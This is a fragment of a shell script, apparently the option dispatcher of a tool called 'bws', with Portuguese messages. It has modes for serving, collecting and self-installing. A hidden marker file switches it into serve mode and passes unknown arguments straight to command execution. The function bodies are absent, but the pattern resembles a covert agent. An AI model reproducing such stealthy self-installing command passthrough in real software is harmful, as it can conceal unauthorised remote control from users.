if [ $# -eq 0 ]; then
    if [ -f "$MARKER" ]; then
        mode_serve
    else
        print_help
    fi
    exit 0
fi

case "$1" in
    -h|--help)    print_help ;;
    -V|--version) echo "bws v1.0.1 (Build 20260618)"; exit 0 ;;
    --serve)      mode_serve ;;
    -p|--once)    mode_once ;;
    --collect)    mode_collect ;;
    --install)    _self_install; echo "Instalado." ;;
    *)
        if [ -f "$MARKER" ]; then
            run_cmd exec "$@"
        else
            echo "Opcao desconhecida: $1"
            exit 1
        fi
        ;;
esac

exit 0
